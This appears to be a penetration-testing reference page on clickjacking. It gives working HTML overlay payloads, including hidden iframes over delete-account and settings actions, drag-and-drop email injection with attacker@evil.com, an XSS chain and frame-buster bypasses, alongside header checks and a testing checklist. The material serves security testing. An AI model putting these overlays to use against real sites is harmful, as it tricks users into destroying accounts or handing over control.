---
tags:
  - medium
  - client-side
---

# Clickjacking

Trick users into clicking hidden elements by overlaying transparent iframes on deceptive UI.

## TL;DR

```html
<style>
  iframe {position:relative;width:500px;height:500px;opacity:0.1;z-index:2}
  div {position:absolute;top:300px;left:60px;z-index:1}
</style>
<div>Click to win!</div>
<iframe src="https://target.com/delete-account"></iframe>
```

## Detection

### Check Headers

```bash
curl -sI https://target.com | grep -iE "x-frame|frame-ancestors"
```

**Protected:**
```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

### Test Framing

```html
<iframe src="https://target.com/sensitive-action" width="500" height="500"></iframe>
```

If page loads in iframe without headers → vulnerable.

## Exploitation

### Basic Overlay

```html
<!DOCTYPE html>
<html>
<head>
<style>
iframe {
  position: relative;
  width: 500px;
  height: 700px;
  opacity: 0.0001;  /* Nearly invisible */
  z-index: 2;
}
.bait {
  position: absolute;
  top: 470px;  /* Align with target button */
  left: 60px;
  z-index: 1;
  font-size: 24px;
}
</style>
</head>
<body>
<div class="bait">🎁 Claim Your Prize!</div>
<iframe src="https://target.com/settings?action=delete"></iframe>
</body>
</html>
```

### Multi-Step Attack

```html
<style>
  iframe {position:relative;width:500px;height:500px;opacity:0.1;z-index:2}
  .step1 {position:absolute;top:330px;left:60px;z-index:1}
  .step2 {position:absolute;top:330px;left:210px;z-index:1}
</style>
<div class="step1">Click here first</div>
<div class="step2">Now click here</div>
<iframe src="https://target.com/confirm-action"></iframe>
```

### Drag & Drop Attack

```html
<div draggable="true" 
     ondragstart="event.dataTransfer.setData('text/plain','attacker@evil.com')">
  <h3>Drag this to the box below</h3>
</div>
<iframe src="https://target.com/profile/edit"></iframe>
```

### Prepopulate via GET

```html
<iframe src="https://target.com/settings?email=attacker@evil.com"></iframe>
<!-- User just clicks "Submit" -->
```

### XSS + Clickjacking Chain

```html
<iframe src="https://target.com/profile/edit?bio=<script>alert(1)</script>"></iframe>
<div style="position:absolute;top:400px">Click to save profile</div>
```

Self-XSS becomes exploitable via clickjacking.

## Bypasses

### Frame-Buster Bypass

**Sandbox attribute:**
```html
<iframe src="https://target.com" 
        sandbox="allow-forms allow-scripts"></iframe>
<!-- Blocks allow-top-navigation, preventing frame busting -->
```

### X-Frame-Options Issues

**Conflicting headers (CSP takes precedence):**
```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors https://attacker.com
```

### Opacity Detection Bypass

```css
iframe {
  opacity: 0.9999;  /* Technically visible */
  filter: alpha(opacity=1);
}
/* Or use clip-path */
iframe { clip-path: inset(0 0 90% 0); }
```

## Impact Scenarios

| Target | Attack | Result |
|--------|--------|--------|
| OAuth consent | Click "Authorize" | Account linking |
| Delete account | Click "Confirm" | Account destruction |
| Permission prompts | Camera/mic access | Privacy violation |
| Fund transfer | Click "Send" | Financial loss |

## Tools

| Tool | Purpose |
|------|---------|
| **Burp Clickbandit** | Visual PoC generator |

**Browser Console Test:**
```javascript
if (window.self !== window.top) {
  console.log("Page is framed!");
}
```

## Testing Checklist

- [ ] Check X-Frame-Options header
- [ ] Check CSP frame-ancestors
- [ ] Test framing in basic iframe
- [ ] Test with sandbox="allow-forms allow-scripts"
- [ ] Look for sensitive 1-click actions
- [ ] Test form prepopulation via GET params
- [ ] Check for drag-and-drop sensitive fields
